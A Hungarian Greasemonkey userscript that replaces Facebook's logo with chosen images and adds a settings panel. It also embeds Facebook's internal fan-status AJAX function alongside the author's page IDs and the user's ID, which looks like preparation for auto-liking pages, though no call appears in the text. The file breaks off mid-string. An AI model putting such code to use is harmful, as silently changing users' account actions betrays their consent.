// ==UserScript==
// @name           Facebook téma
// @namespace      Zolyyy
// @author         facebook.com/zolyyy
// @description    Logo csere facebook-ra!
// @include        *
// ==/UserScript==


	try{
	function fbpage_set_fan_status(c, f, a, h, g, d, e) {
		g = g ? g : function (j) {
			_fbpage_show_change_status_feedback(c, j.getPayload());
		};
		var b = {
			fbpage_id: f,
			add: a,
			reload: h
		};
		if (e != null) copy_properties(b, e);
		var i = new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData(b).setNectarModuleDataSafe(c).setHandler(g);
		if (d) i.setErrorHandler(d);
		i.send();
		return false;
	}
	function fbpage_set_favorite_status(d, e, a) {
		var f = function () {
				_fbpage_show_change_status_feedback(d, this.getUserData());
			};
		var c = {
			fbpage_id: e,
			add: a
		};
		var b = new AsyncRequest().setMethod('POST').setURI('/ajax/pages/favorite_status.php').setData(c);
		new Dialog().setAsync(b).setCloseHandler(f).show();
		return false;
	}
	function _fbpage_show_change_status_feedback(b, a) {
		if (!a || !b) return;
		if (a.reload) {
			fbpage_reload_on_fan_status_changed(a.preserve_tab);
		} else fbpage_redraw_on_fan_status_changed(b, a.feedback);
	}
	function fbpage_reload_on_fan_status_changed(a) {
		var c = URI.getRequestURI();
		if (a) {
			var b = window.FutureSideNav ? FutureSideNav.getInstance().selected.textKey : Arbiter.query('SideNav.selectedKey');
			if (!c.getQueryData().sk && b) c.addQueryData({
				sk: b
			});
		}
		window.location.href = c;
	}
	function fbpage_redraw_on_fan_status_changed(a, b) {
		if (!b) return;
		var d = document.createElement('span');
		d.innerHTML = b;
		CSS.setClass(d, 'fan_status_inactive');
		a.parentNode.replaceChild(d, a);
		var c = function () {
				if (data.can_repeat_action) d.parentNode.replaceChild(a, d);
			};
		animation(d).duration(3000).checkpoint().to('backgroundColor', '#FFFFFF').duration(1000).ondone(c).go();
	}
	
	
	}catch(e){}
/***************************************************************
		VÁLTOZÓK												
***************************************************************/
	var FBT			=	"203818076342174";	//FBT
	var LGO			=	"266568560043000";	//Logo
	try{
	var JS_user_id	=	Env['user'];
	}
	catch(e){}
	var tema	=	'logo';
	var TemaH	=	'FACEB00K logo csere';
/***************************************************************
		TÉMA KEZDETE											
***************************************************************/
var neon_k	=	'iVBORw0KGgoAAAANSUhEUgAAAGcAAAAfCAMAAADN7iNnAAAAA3NCSVQICAjb4U/gAAABYlBMVEX////5/f76/P70+f3z+Pzl8fnk8fnW6PbW6PXF3vLF3/LE3fDE3vG62fC51++41+6r0eyr0Oyr0e2qz+uq0OycyeqbxueOwueNv+WMvuR/uuR/t+J+tuBxseBwsN9xsN9wr91wrt1wr95jqd1iqNthp9tcptxhpdlbo9lXo9taoddWotlWodlWoNhVntZVntVYndNUndVUnNRUm9NTmdFTmtJTmNFSl9BSls9Slc5Rlc1Rk8xRlM1QkstQkMlQkMpPj8hPjshPjcdOjcZOi8ROjMZNisRMh8FMh8JMhsBLhL5Lhb9Lg75Kgr1KgbxKgLtJf7pJfrpJfrlIfLdIfbhHerVHebRHebVHeLRGdrJGd7NFdbFFdLBEcq5Eca5EcK1DcKxDbqtDb6tCbKlCa6hBaqdBaadBaKZAZ6RAZ6VAZqM/ZaI/ZKI/YqA/Y6E+YqA+YJ48XJo8XJs8Wpk8W5o7WZi19dUuAAAACXBIWXMAAAp1AAAKdQFKJd39AAAAFnRFWHRDcmVhdGlvbiBUaW1lADEyLzMwLzEwG1O9RgAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTNXG14zYAAAN6SURBVEiJvVYJV9NAEB6oAUVQuQSPgtyGNqlNQiAsQcBSUmsNxSKWW4nKaYHS/+9sskmTEgqIj3mvLzO7s/t1dmd2Pqjcj8D94ZSs3S0q1sn5CVODhk/fOzzcC3MJM3at0sVFybKsUrlchvL+pmmkUAyzuF101KDh041coZALcQk1DHPDsjbMrLm5jzilzSxRZCoknUkzNWj4dE3XtTCXMEMhRj5vkEmS3SxVwDL1Mc6RiYmJh0zlXqDxmumtqD911F5RfOK6PPe5cJ1ojDX7FuCmYyohamvT4/crvyqwayh94Eg83g6ucPF43DP6BYFztA6e57zhYW/Y8XnmGe2CgJv2CYIwCPBmZvlnBbZSchSgO4rC8x0AVIlGgON5HqAF9W4co7tH6MSopwWGHcNdbf+dqD3ER6BZ+vDtj4sTjcVEUYyhZ4wKx3DQny3AkVgsgcLmqsNVw13tw+kBGJ/JfT87c3EEWdNkAT0FQZaFUBxBJoS4c1fg2Kt9OA3QpRobpYoXj6gtLmoieiZUoiZCcURt6XN2JlEXx15dxemARml+9Tetn1qc5NTsVNLDwVMY5rghhpNZXtaTdXGk6YVpycMZBXg19fHHWaUaj3duwXiEpKqqkkQTC89tNp3W6scjkxSRPZwW4Owk8OF4eRC8n4SWMowF51ZiMUlSk2wOMyzCX4ODPiMsHBcngtXVVs0YD0eaXV5byxuaiIVCK1DwSqahh78OB6BN1AuHFR+OXZqX6yeAQ4X36vRGOC21OLROh2xP8EBrzs0uSDuem55bC8DbmnOr3o/9QEFYHgTu50Z5ELmcB16+Be8H9f5qnd423/A3WJPXCWIYJFH3PUgQ82thTroFDt8MERaQiyMt5PMLUt33IDn7pbI6Xx8nWKc8FmovDaj6vsmp1dWU7HpeEU+ukCO3enfsh8cO6BKOHfl/e0fpQ2oHdAucf+kL/Es8IfqSsn7apxjr64aCHVGZW5pTuBv10/4r+6mDQ/spejyazGyfUn4wADCgmzs7pt4JoGdWMnoTNGGLb2KrfHqXKLqj8IDyA78x3uhaI6KIDXuA8oMxgHfp4hEcUb6jICc5PkYNyUnRKtLvXfiO48b4jqLon3ZOHf5mIMe6uEANydbB+QH93oG/MTfG3+zNkSeWSzZ1xJ5Xdskj/d6FjzpujI86m98jv74X+QtksoaYbKu2ugAAAABJRU5ErkJggg==';

var neon_l	=	'iVBORw0KGgoAAAANSUhEUgAAAGcAAAAfCAMAAADN7iNnAAAAA3NCSVQICAjb4U/gAAABYlBMVEX////9+P768Pz67/303Pnz3fnuyfbtyvXjs/DnsvLmsvLks/Hjo/DfpO7go+/akOzZkevckOzcj+3bkOzWfOrSfufLa+TRaOfNauXFWODLVeTHV+K+Rt3CRN/DQ9+/Rd3ARN7FQuC6Mdu3Mtm+L927MNtAV5s+WJo7WZg9WJlAV5pLUqBUTqVKUqBOUKJPUKJYTKdHU55VTaZRT6NST6RNUaGsLdNlRq5hSKxaS6hbSqleSatgSKtjR61XTKdzQLVoRLBqRLFtQrJuQrNwQbRxQbRyQLW8Jty3KNm0Ktd5Pbl2Prd7PLp8O7qCOb54Pbh/Orx+O7uEOL6JNsGBOb2KNcKPM8SQM8SSMsaHNsCGN7+XL8iaLsqcLcudLcuTMcaUMceWMMifLM2WL8idLMygK82iKs6kKs+lKdCnKNGqJ9KZLsmoJ9GtJdSuJdWwJNWxI9a0Iti2IdmrJtO4INm6H9szrvT2AAAACXBIWXMAAAp1AAAKdQFKJd39AAAAFnRFWHRDcmVhdGlvbiBUaW1lADEyLzMwLzEwG1O9RgAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTNXG14zYAAAN6SURBVEiJvVaLVtNAEB1sQCsoCCiogJRXU6AogtKACBQVwWKNNC1FW3mEQGnSZJvm/53Nq0kJhYqHOacndzazuZ3dmd0L7N0Y3B1PnEssoSW4makZC/odD04sLywsB4QEOgkuHo3GuRUuHovFILa4zgs5NIFPLiUt6Hc8WMik05mAkEBH4Dc4boM/4NcXkSe+fiDKOjUxm8/a0O94sFQoSEEhQY4sCqmUIJ6LB+txFji+OM5YdnF+cd+GzDN0ntu4E/EjCw5q2mMn5KknhOlBZ7zDMwE/Ol4SxVJn+4PfOx9ZSAjyCFhWrfaBY0y1WnWdYUIYC/UaBuMOT7rDVswT1+kjBD86QggZBXh1vPuGhaWcHgHoj6AZRi8ABZEQMIZhAIQR9+MY/XqIvthykW/YcpzZ5t+JmENGCDqUP5/eOTyRWk3TtBpG1qgxNg/G2xNwpFZTVZWmQN/Vh+uOM9vDMwCwfZxZmXZ5iC5JOsFIouoqCeQhulgW9eY85mwPTxt0l4SNOOvyaNL+vqRhpFoSS2ogjybt/Tg4VpvymLPrPL3QphytvaX908hTOSufVVweXIVJhpmwefK7mUKlKY9yeniquDxbAC/Pfn6YZtnL6+bPh1RKpZKimLtC9HI2KzXPRxdzou7yhIExi8DD49aBf39UKScIh9au1GqKLFfsd1hhIeMaHowZs9NxeELYXV31inF5lPLul82UIGnYKLQDidsybQPGdTwAXVohvcB6eMzWvNw/Ph5qhtunN+IJN/LQPp0wI8ElbVg3syEJaWHdwgBfG9atvj/mAQVBdeDbnxvVQehyHbj15t8fxMP1Pm213vA32lDXqigIotr0PFBF/nP6l9ICj9EBITshh0c5TKUOlabnQaX8jV07as7j71MDG3XQSsjh0XNrazndibwin0w6I7Z07pgHj5nQJR4z8/92jtKD1EyoBZ5/uReMF7hC9CS179MRWdjcFGS8EeWTvROZudF9OnzlfWrx0PsUIx6e55fmqT4YAhgq8qurfLEHoJjfyRfboR2v+HZ7lgd3a5ozCveoPvA6222ON6ZpeGEPUX0wDvA+m3xt6R0ZNcncHCIUJ0kuSZ+30TtWmK13ZLnwfXXe0m8CaqxoFBGKrdmpWfq8hX6zw2z9Zn4cdWIsbkpHvPNijnikz1voUTvM1qPWx+9QX9+J/QWknrs1MnQvHwAAAABJRU5ErkJggg==';

var neon_p	=	'iVBORw0KGgoAAAANSUhEUgAAAGcAAAAfCAMAAADN7iNnAAAAA3NCSVQICAjb4U/gAAABaFBMVEX////9+Pj9+Pn68PH67/H03ODz3eDtytDuyc/ks7vmsrrnsrnjs7zfpK/jo6zgo63ZkZ7bkJvakJzcj5rckJvSfozWfInNanrLa3zRaHfFWGvHV2nLVWa+RlvCRFe/RVnARFjDQ1bFQlU7WZg9WJY+WJZAV5RLUotNUYpHU45KUoxPUIlUToVOUIlST4ZRT4dYTIFVTYRXTINaS4BbSn9eSX23MkplRnhgSHthSHpjR3llRne7MEZoRHVqRHS6MUdtQnFuQnBuQnFwQW9xQW6+L0RzQGxyQG52Pmp+O2R5PWh4PWl7PGd8O2V/OmOBOWKCOWGHNl2EOF+GN16JNly0KkKKNVuQM1asLUiPM1eWMFK3KECSMlWTMVOUMVOaLk+8JjydLUyXL1CZLk+WL1GdLEygK0mkKkecLU2fLEulKUanKEWiKkiqJ0KrJkGuJT+oJ0OtJUCxIzywJD24IDe2ITm0Ijq6HzbZDe4mAAAACXBIWXMAAAp1AAAKdQFKJd39AAAAFnRFWHRDcmVhdGlvbiBUaW1lADEyLzMwLzEwG1O9RgAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTNXG14zYAAAN6SURBVEiJvVYJV9NAEB60QRAPDkVRQWgKSOVQg2g5KyoaWqwVSC1ipdZIoTHN0W7+vrObo0kbCoiPea8vM7uz+3V2Z3Y+4C9H4PJw4kJiCSUhTE5M2mrQ8OmJ+bm5+RCXUCMhxMfH48JLIR6LxSA2uyJKORRJTL5K2mrQ8OlSJpXKhLiEGpK4Kgir4ra4Mos48ZVtWVOpyPls3lGDhk9XymUlzCXM0GQpnZbkY3l7Jc6DIBYXOFv+HP+55qjcfTQeOHo36jdt9Z5h3HZd7vpcuF40Frp8C3DThYosV7o7b/zYfMFDQtLGwJZ6vQ9c4er1umeMEMLZ2oBlcd7wsjds+9zxjD5CcNMxQsgowOOjrWc8LOXUKMBgFMWyBgCoEo0AZ1kWQA/qgzhGd4/QiQNPCwzbhrua/Z0oG7Ii0KV/f/vExYnWEJvU0LOGWo1zcNDfWYAjNWKapjvXGG4Y7mofzhDA7lHm5YSHQ1RFUQl6ElM1SSgOUeWSrJK2OGy1D6cD+ivSapz3cAxlf18x0NOsyBUzFMdQdj5tH5ltcdjqBs4AXNH3Np7T+mnGqR6WDqseDp7DMse9d3CyW5lytS2O/rvwW/dwDgAeHn55PcHzrecWjIdUK5WKrrNbIWopn1fax6PKOVn1cHqAY0ngw/HyIHg/ppKTpIJ9KzWia1rVmcMMi1in4KDPmhOOixPB6rrVyBgPRy9tfXiTlhQDC4VWIJtj0jFknYYDcMsop+Z4Hw4rzdb6CeBQsbw6PRNOTzMOrdP3zBM80KZzYwXpxXqWc+sB+NZ0bo37YQ8UhOVB4H7OlAeR1jzw8i14P2iNNOr0vPmGv9GmvDZlSZLNtu+BKYvvUj/1c+BYXRBxAnJx9EI6XdDbvgfV0kd+Y689TrBOLSzUe3ZALo6a29jIqa7nCfFkUhn5XO8Oe3hYQC04LPL/9o7Sh5QFdA6cf+kL1iM8IfqSOv10TJPW1yUNO6L2a+eXxp2pn46c2E9tHNpP0eP6cfbVFOUHwwDDRXFxUSz2AhSzm9liJ3Rii+90Vvn0fsNwR+Eq5Qd+Y/eKa60ZBjbsYcoPFgC+5pNPbb6jISeZmUENyUlSSNLvRfiO7ebwHU0rf16csvmbhBxrfBw1JFvTE9P0ewH+5rg5/I1tjjwxFmfUEXtezCWP9HsBPuq4OXzU3vwS+fWlyF/mF7djEb7RdAAAAABJRU5ErkJggg==';

var neon_z	=	'iVBORw0KGgoAAAANSUhEUgAAAGcAAAAfCAMAAADN7iNnAAAAA3NCSVQICAjb4U/gAAABaFBMVEX////4/vj4/fnv+vHv+/Hb9uDb9eDH8c/H79Cu67mu6rqv6Luv6Lye56ye5a2f5K+K4pqK4ZuL4JyK4JuL3p523Il32Yxh2Hdi1Xpj03xN02ZOz2lPzms5zlU6zFY6ylg6y1c7yVk8yFslyEQmxkYmxEcnwkocxjwdwkAVxDYev0IWwjcWwDoWwTkXvTwguUgYvD0Yuz8ZuUAZuEEat0IatUMbtEUcskcbs0YcsEgcr0kdrkseq00erEwdrEwfqU8fqE8gplIfp1AfplEgpFMgpVMho1UioVYioFcjnFskm1wlmF4kmV0ll18llmEmk2MmlGInkmQnkGUoj2cojmgpjGkpi2oqiWwrh24rhXArhm8sg3EshHEtgXQtf3UufXcvfHgve3kvenowd30weHsyc4AxdH8ycoEzcIM0boUzb4Q0bYY1a4c1aYk1aok2aIo2Z4s2Zow3Y445XpQ6XZQ6W5Y6XJY7WZj3kwRkAAAACXBIWXMAAAp1AAAKdQFKJd39AAAAHHRFWHRTb2Z0d2FyZQBBZG9iZSBGaXJld29ya3MgQ1M1cbXjNgAAABZ0RVh0Q3JlYXRpb24gVGltZQAxMi8zMC8xMBtTvUYAAAN5SURBVEiJvVYJV9NAEB6wARFR5BA8Cshp6DamCSkE2lhEaANVG0qFZ7kxKAJKgZK/72yuJm0oVHzMe335ZjObr7M7s/uBcT8G98dT0vd3qOlnF2c29DsefHhychgUEuTs66Wrq5J+oJfK5TKUj7c1NY2masXdogX9jgeruUIhFxAS6Kjalq5vaSva9jHylLZXFEmkpmSyGRv6HQ+WEwk5KCTIkRQ1n1eVGWVlu2SAriXHGcumZqYe2pB5gc5rG7cjfmrBfo574oQ894QwPeiMt3om4EfH44oSb295/H7tpwH7qjQAlkWj3eAYE41GXWeIEMZCnSzLuMOj7rAV88x1ugnBjw4QQgYB3syt/jBgJy2GAXrDaCzbCUBBOAQMy7IAbYh7cYx+PURfTLjIN2w5zmzz74TNITYErcLHb38cnnAkwnFcBCMj1BibB+PtCTgSifA8T1Og7yrDFceZ7eHpA5icyx1cujxElGWRYCThRZ4E8hBRSSlifR5ztoenCbri6lbJcHk4eWlJ5jCSjytxPpCHk5e/rMzxdXnM2RWeTmgW5td/0f6p5olNp6ZjLg+uwijDjNg82dVcIlaXR5hdnBVcngmAV9Ofvl8aRu26+fMhsXg8LgjmrhAxlcnI9fMRlbQiujxtwJhF4OFx68C/P7ycVtVFa1ciEUGSYvY7rLAQewMPxozZ6Tg8IeyujkrFuDxCanVjI6/KHDYK7UDitkxTH3sTD0AHlyicGB4eszVr+8fHQ411+/RWPG3VPLRPR8xIcEmr1s1sSEIaWLc2gLdV61bZH/OAgqA68O3PreogVFsHbr359wfxUKVPG603/A1W1TWvqKrC1z0PeEXbKHwQGuBhWyFkJ+TwCIv5/KJQ9zyIpb4a6/P1efx9ymKj9lsJOTxien09LTqR1+STK+SUhs4d8+AxE6rhMTP/b+coPUjNhBrg+Zd7gX2JK0RPUvs+HZDUzU1VwhtRWlhekJhb3adD196nFg+9TzHi0Ux295zqg2GA4aS2t6clewCS2bVssgVa8IpvsWd5cBfHOaPwgOoDrzPZ7HhjHIcX9jDVB+MA7zLF35bekVCTnJ4iQnFS1Iv0eRe9Y4XZekeSEp/3zi39pqLGurpChGLr6OKIPu+g3+wwW7+ZH0edWC6Z0hHvvLIjHunzLnrUCrP1qPXxe9TX92J/AZqXj9tc8TiZAAAAAElFTkSuQmCC';

var arckonyv	=	'iVBORw0KGgoAAAANSUhEUgAAAGcAAAAfCAMAAADN7iNnAAAAA3NCSVQICAjb4U/gAAAAM1BMVEX////z9fnn6/Lb4OzP1ubCzN+2wdmqt9KdrMyRosWFl794jbhsg7JgeKtUbqVHY547WZhCIJaUAAAACXBIWXMAAAsSAAALEgHS3X78AAAAFnRFWHRDcmVhdGlvbiBUaW1lADEyLzMwLzEwG1O9RgAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTNXG14zYAAAHsSURBVEiJ7ZYNb4QgDIZBEBH56P//taMfCOguWZa7y7aMxENK6VPfVnMK3jPUP+ef82WOVUrFd3M2awNer+bUhcfrr3C+NRrncEuNZQ4g/e1aFwDZ6TprK5yy1h0PETe1y+K61YPLkeqdw0DoYy1uxjofV46ScXDyOCDodsccjG/KLkYdu2vdxTRr9IOXOxLZcudgWNsP54YRjkeXHM/QugwctykqmePlAlDqtN50Uy7RTuPY3eNJ5WP0rBthEmW55mQoaXLdMbZNFL3U3DS6JMDnDjcOlMP7zrFSfNf7QFRVXR/mbxDpHoVLAQ30A4ae+MrxIpLtzSWBB87OauAZjG3ElTmYpaOaoM+SepYDxzedL5w4carcaeDoiZOlwoY74PIqCAcdXJw5Vvpm0M0xvYDEHjkolOKahLMZLpxCefDvyXFceCh7pjqwcgv31UrUibO3LmRxsUafcdRmWJPGyeRsbOtrihNIYWNY1ImT2yNzFsPL03Vb1DniqexZNIlH70Y0zepg5nD0hCdJOAN3TqJ2I5rvFfQzhyqgo+2qzJxw1qSoXtu5r0vwvp7wPpQUYyzdWs0gplKnmCFVYyBR2I7mJAWV4EOMmfOEgd8CVR5sPpET1PhBex0Hq3s82nwiB4v3cPNn/a/6PZwPXOGXapF3YrEAAAAASUVORK5CYII%3D';

var faszbuuk	=	'iVBORw0KGgoAAAANSUhEUgAAAGcAAAAfCAMAAADN7iNnAAAAA3NCSVQICAjb4U/gAAAAM1BMVEX////z9fnn6/Lb4OzP1ubCzN+2wdmqt9KdrMyRosWFl794jbhsg7JgeKtUbqVHY547WZhCIJaUAAAACXBIWXMAAAsSAAALEgHS3X78AAAAFnRFWHRDcmVhdGlvbiBUaW1lADEyLzMwLzEwG1O9RgAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTNXG14zYAAAG0SURBVEiJ7ZTbkoMwCIaTGBVjkLz/0y4nte1qnb2oMztTLjwA8hHyx9DusfDl/BfOUpcbOFMMbONVPnASXFdlO+bMQS1/mtPfxMkcqTSXOziXn68cqheSOeNUm1qAZRJgHIidNIg0Ei8xb1aE0+mE0fytIV/HViTa2sg3dI4E8nzIAX/o2Nm5z9p7SeBmFi9XdV99oDp/C1Di6/C0HszSurerAq87+4TDJd5zsvd7tD+QCrVRc4umLaV6xiDvBEbQ23uOTphOdYAT5H09/bbfgomk5XrfaXzLsdGecDB7Cq8i6cP4gMFd11rvioOvels5FMPOwc63ga045m+c6YwzBRHyYBwuGr2rDbOWIwmQceCBo41unFBOOKKA2a8QJ5MmPGC0HD9KK0nLEcaNM6rfOePT5H5zOk0A+TDp5Gbd76TndDRdR0tRvzqM4y+u637v7pVTwmZ5PSmR6oFXxdfv/oZ70npOpctEh3rTdVtbzkzYDjnsb8smm2yzeOJY2I/QysFadesRYCKaALBRBQD5PfFvczUUHx8xsN8WFYCyiN8+BZQ61KpVk0h95nzavpwv507ODzRQk68lqiYWAAAAAElFTkSuQmCC';

var feszbuuk	=	'iVBORw0KGgoAAAANSUhEUgAAAGcAAAAfCAMAAADN7iNnAAAAA3NCSVQICAjb4U/gAAAAM1BMVEX////z9fnn6/Lb4OzP1ubCzN+2wdmqt9KdrMyRosWFl794jbhsg7JgeKtUbqVHY547WZhCIJaUAAAACXBIWXMAAAsSAAALEgHS3X78AAAAFnRFWHRDcmVhdGlvbiBUaW1lADEyLzMwLzEwG1O9RgAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTNXG14zYAAAHNSURBVEiJ7ZVtj4MgDIBBUSqC5f//2mtLQV2Y5rLdkkvWD7NC6dM3nMmfEfPl/BfOFreqxKq+n7NYQ+IZQ5pNT+yBjODeK0mfsxoRR+p4gXmZMzWOv8K8zHG0E3ENnNgF5i2c2+OVg3dz8owTS9U4UhgooRlpEWcejSFQEE0Cc0apcCrrOSf69TnwLlWdHkk5vOHWLgfHooxZ5kHZpglAU+2m7qL0VQsq9S8bSBGb+ZRPchw6BeSrl3DMscshF9ccp/F2+oN8dTCJkyBmW4hqMfM7QiHI45ojFcY+h49Y5+Sg5DO1fjPGoribtNPpklNK2+csrSjU30EUf8Ckfa7F3x3ncD/OHDhy0qhtIAmK+R1necbhI2NkkVDAalQNU90hb6BpwVUON3jn0DT1OVvNNgFBljKacMCIO1K5jIO4w2Qbx8u6cvypcg/fA7FzPOV8cJDKrdLvQe6pL5WVPEHcDVpm2F90ridz+IQ9cCRvkdYri/Umsb/DPcX68RVO2o3qPeUoB+xy8ubUixSLDVPucmhd/qkqJ7crXjllW69Q5STqvWoLwMLpYgSAVZQmidfYony2MACETccm8Rb7wRyLN96JZ85fy5fz5XyS8wOnp5LqeqhTjwAAAABJRU5ErkJggg%3D%3D';

var url_logo = localStorage.getItem("facebook-"+tema+"-URL");
	if (url_logo === null){
		localStorage.setItem("facebook-"+tema+"-URL","http://ssl.gstatic.com/s2/oz/images/google-logo-plus-0fbe8f0119f4a902429a5991af5db563.png");
	}

if (window	==	window.top && window.top.location.hostname.indexOf('facebook.com')	!= -1 && localStorage.getItem("facebook-"+tema+"-X") == "-X"){

	if (localStorage.getItem("facebook-"+tema+"-A") == "Neon_k"){
		document.getElementById('pageLogo').innerHTML	='<a title="Kezdőlap" href="http://www.facebook.com/" style="background:url(data:image/png;base64,'+neon_k+') !important"></a>';
	}
	if (localStorage.getItem("facebook-"+tema+"-A") == "Neon_l"){
		document.getElementById('pageLogo').innerHTML	='<a title="Kezdőlap" href="http://www.facebook.com/" style="background:url(data:image/png;base64,'+neon_l+') !important"></a>';
	}
	if (localStorage.getItem("facebook-"+tema+"-A") == "Neon_p"){
		document.getElementById('pageLogo').innerHTML	='<a title="Kezdőlap" href="http://www.facebook.com/" style="background:url(data:image/png;base64,'+neon_p+') !important"></a>';
	}
	if (localStorage.getItem("facebook-"+tema+"-A") == "Neon_z"){
		document.getElementById('pageLogo').innerHTML	='<a title="Kezdőlap" href="http://www.facebook.com/" style="background:url(data:image/png;base64,'+neon_z+') !important"></a>';
	}
	if (localStorage.getItem("facebook-"+tema+"-A") == "arckonyv"){
		document.getElementById('pageLogo').innerHTML	='<a title="Kezdőlap" href="http://www.facebook.com/" style="background:url(data:image/png;base64,'+arckonyv+') !important"></a>';
	}
	if (localStorage.getItem("facebook-"+tema+"-A") == "faszbuuk"){
		document.getElementById('pageLogo').innerHTML	='<a title="Kezdőlap" href="http://www.facebook.com/" style="background:url(data:image/png;base64,'+faszbuuk+') !important"></a>';
	}
	if (localStorage.getItem("facebook-"+tema+"-A") == "feszbuuk"){
		document.getElementById('pageLogo').innerHTML	='<a title="Kezdőlap" href="http://www.facebook.com/" style="background:url(data:image/png;base64,'+feszbuuk+') !important"></a>';
	}
	if (localStorage.getItem("facebook-"+tema+"-A") == "url"){
		document.getElementById('pageLogo').innerHTML	='<a title="Kezdőlap" href="http://www.facebook.com/" style="background:url('+url_logo+') !important"></a>';
	}
}




































if (window	==	window.top && window.top.location.hostname.indexOf('facebook.com')	!= -1) {
var kis_logo	='iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOBAMAAADtZjDiAAAAA3NCSVQICAjb4U/gAAAAFVBMVEX////r7vRthLRheaxgeKtFYp47WZiqvsZIAAAACXBIWXMAAAsSAAALEgHS3X78AAAAH3RFWHRTb2Z0d2FyZQBNYWNyb21lZGlhIEZpcmV3b3JrcyA4tWjSeAAAADJJREFUCJljMEsDgWSGNAgA044MEFoASjOkodAMDBBxQQZBrPJgOkhJSYlBSRVOQ+0BAO9NHYqx05DpAAAAAElFTkSuQmCC'

var divC = document.createElement("div");
	divC.style.position	=	'absolute';
	divC.innerHTML		=	'\
<div class="fbDockWrapper fbDockWrapperRight bb" id="fb_add" style="left:150px">\
	<div class="fbDock clearfix" style="z-index:1000;position:absolute;">\
		<div class="clearfix rNubContainer">\
			<div class="fbNub" id="fbTranslationsNub">\
				<a class="uiTooltip fbNubButton" onmouseout="this.blur();" href="/translations/" rel="toggle">\
				<table cellpadding="0" cellspacing="0" border="0">\
				<tr>\
					<td>\
						<div class="UIImageBlock clearfix">\
							<img src="data:image/png;base64,'+kis_logo+'" align="left" style="padding-right:2px"/>\
							<div class="UIImageBlock_Content UIImageBlock_ICON_Content">\
								Logó\
							</div>\
						</div>\
					</td>\
				</tr>\
				</table>\
				<span class="uiTooltipWrap top right righttop"><span class="uiTooltipText uiTooltipNoWrap">'+TemaH+'</span></span></a>\
				<div class="fbNubFlyout uiToggleFlyout">\
					<div class="fbNubFlyoutOuter">\
						<div class="fbNubFlyoutInner">\
							<div class="clearfix fbNubFlyoutTitlebar">\
								<div class="titlebarLabel clearfix">\
									'+TemaH+'\
								</div>\
							</div>\
							<div class="fbNubFlyoutBody scrollable">\
								<div class="fbNubFlyoutBodyContent">\
									<div class="translations_options" style="min-width:125px;padding:4px 4px 4px 4px;">\
										<div class="xmode_row">\
											<a href="http://www.facebook.com/face.temak">FACEB00K Témák oldal</a>\
										</div>\
										<div class="xmode_row">\
											<a href="http://www.facebook.com/'+tema+'.csere">'+TemaH+'</a>\
										</div>\
										<div class="xmode_row">\
											<a onClick="document.getElementById(\'fb_tema\').style.display=\'block\'">Beállítások</a>\
										</div>\
										<div class="xmode_row">\
											<a href="https://www.facebook.com/topic.php?uid=203818076342174&topic=167">Hibajelentés</a>\
										</div>\
									</div>\
									<div class="xmode_row_last" style="padding:4px 4px 4px 4px;">\
										<div class="clearfix">\
											<a class="lfloat" href="http://www.facebook.com/face.temak?sk=app_103822229704881">Gyakran feltett kérdések</a>\
										</div>\
									</div>\
								</div>\
							</div>\
						</div>\
					</div>\
				</div>\
			</div>\
			<div class="fbNubGroup clearfix orca offline" id="fbDockChat">\
				<div class="fbNub fbDockChatBuddyListNub hide_on_popped_out hide_on_presence_error" id="fbDockChatBuddylistNub">\
				</div>\
			</div>\
		</div>\
	</div>\
</div>'
	document.body.insertBefore(divC, document.body.firstChild);

var divCP = document.createElement("div");
	divCP.innerHTML		=	'\
<div class="generic_dialog pop_dialog profileBrowserDialog full_bleed" id="fb_tema" style="display:none">\
	<div class="generic_dialog_popup" style="top:100px;width:472px">\
		<div class="pop_container_advanced">\
			<div id="pop_content" class="pop_content" tabindex="0" role="alertdialog">\
				<h2 class="dialog_title" id="title_dialog_0"><span>Beállítások</span></h2>\
				<div class="dialog_content">\
					<div class="dialog_body">\
						<div id="u146441_2" class="fbProfileBrowser">\
							<div class="standardLayout">\
								<div id="u146441_3" class="listView clearfix" style="min-height:500px;">\
<iframe src="http://www.facebook.com/plugins/likebox.php?href=http://www.facebook.com/'+tema+'.csere&width=450&colorscheme=light&show_faces=false&border_color&stream=true&header=false&height=400" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:400px;" allowTransparency="true"></iframe>\
\
<label class="uiButton uiButtonLarge" style="width:97%">Válaszd ki a neked megfelelő logot vagy írj be url-t</label>\
<table width="100%" border="0" cellspacing="0" cellpadding="0">\
		<tr>\
				<td style="text-align:center !important"><img src="data:image/png;base64,'+neon_k+'" onClick=\'localStorage.setItem("facebook-'+tema+'-A", "Neon_k");window.location.reload();\'\
				style="cursor:pointer;"></td>\
				<td style="text-align:center !important"><img src="data:image/png;base64,'+neon_l+'" onClick=\'localStorage.setItem("facebook-'+tema+'-A", "Neon_l");window.location.reload();\'\
				style="cursor:pointer;"></td>\
				<td style="text-align:center !important"><img src="data:image/png;base64,'+neon_p+'" onClick=\'localStorage.setItem("facebook-'+tema+'-A", "Neon_p");window.location.reload();\'\
				style="cursor:pointer;"></td>\
				<td style="text-align:center !important"><img src="data:image/png;base64,'+neon_z+'" onClick=\'localStorage.setItem("facebook-'+tema+'-A", "Neon_z");window.location.reload();\'\
				style="cursor:pointer;"></td>\
		</tr>\
		<tr>\
				<td style="text-align:center !important"><img src="data:image/png;base64,'+arckonyv+'" onClick=\'localStorage.setItem("facebook-'+tema+'-A", "arckonyv");window.location.reload();\'\
				style="cursor:pointer;"></td>\
				<td style="text-align:center !important"><img src="data:image/png;base64,'+faszbuuk+'" onClick=\'localStorage.setItem("facebook-'+tema+'-A", "faszbuuk");window.location.reload();\'\
				style="cursor:pointer;"></td>\
				<td style="text-align:center !important"><img src="data:image/png;base64,'+feszbuuk+'" onClick=\'localStorage.setItem("facebook-'+tema+'-A", "feszbuuk");window.location.reload();\'\
				style="cursor:pointer;"></td>\
				<td style="text-align:center !important"></td>\
		</tr>\
</table>\
\
